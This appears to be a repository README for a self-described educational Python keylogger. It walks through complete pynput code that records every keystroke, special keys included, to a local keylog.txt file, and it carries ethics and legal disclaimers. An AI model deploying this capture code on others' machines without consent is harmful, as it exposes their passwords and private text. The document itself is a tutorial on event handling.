<h1>Global Keyboard Event Listener (Educational Keylogger)</h1>
This repository contains a simple Python-based keylogger, designed for educational purposes to demonstrate how keyboard events can be captured and logged. The project is built using the pynput library and is intended to be used in a controlled and ethical environment. <br />

<h2>Features</h2>
- Captures global keyboard inputs, including both standard and special keys. <br />
- Logs keystrokes to a local file (keylog.txt). <br />
- Designed for educational purposes to explore system-level event handling. <br />
- Easy to use and extend for further experimentation.

<h2>Requirements</h2>
- Python 3.6 or higher <br />
- pynput library

<h2>Setup and Installation</h2>

1. Clone the Repository:

```
git clone https://github.com/yourusername/global-keyboard-listener.git
cd global-keyboard-listener
```

2. Install Dependencies: Install the required library:

```
pip install pynput
```

3. Run the Script:

```
python keylogger.py
```

4. Test It:
- Open any application (e.g., a text editor or browser).
- Type some text, press special keys (e.g., Enter, Shift), and then check the keylog.txt file for logged entries.

<h2>Usage</h2>
This script is for educational purposes only and must be used in a controlled environment. Unauthorized deployment or use may violate ethical guidelines and legal regulations. <br />

<h2>Code Explanation</h2>

1. Import Libraries

```
from pynput.keyboard import Listener
```
The Listener class from the pynput.keyboard module is used to monitor keyboard events.

2. Log File Path

```
log_file = "keylog.txt"
```
Specifies the file where keystrokes will be saved.

3. Handle Key Press Events

```
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")
```
Logs regular keys as key.char.

Logs special keys (e.g., Enter, Shift) in square brackets using key.

4. Start the Listener

```
def main():
    with Listener(on_press=on_press) as listener:
        listener.join()
```
Initializes the listener and starts monitoring keyboard inputs.

<h2>Example Output</h2>
For the following sequence of inputs: <br />

Hello World

[Backspace]

[Enter]

The keylog.txt file will contain:

```
Hello World[Backspace][Enter]
```

<h2>Ethical Use</h2>
This project is strictly for educational and ethical purposes. Ensure you:

- Test only in a controlled environment. <br />
- Have explicit permission to use the tool on any system. <br />
- Do not deploy this script for malicious purposes.

<h2>Future Enhancements</h2>
- Add encryption for the log file. <br />
- Include a timestamp for each logged keystroke. <br />
- Create a user interface for easier interaction.

<h2>Contributing</h2>
Contributions are welcome! If you have ideas for enhancements or bug fixes, feel free to: <br />

- Fork the repository. <br />
- Create a feature branch. <br />
- Submit a pull request.

<h2>License</h2>
This project is licensed under the MIT License. See the LICENSE file for details.

<h2>Disclaimer</h2>
This project is provided for educational purposes only. The developer assumes no responsibility for any misuse or damages caused by the use of this tool. Unauthorized use of this tool, including but not limited to monitoring without permission, may violate local, national, or international laws. Users are solely responsible for ensuring compliance with all applicable laws and ethical guidelines.
By using this tool, you agree to these terms and accept full responsibility for its usage.
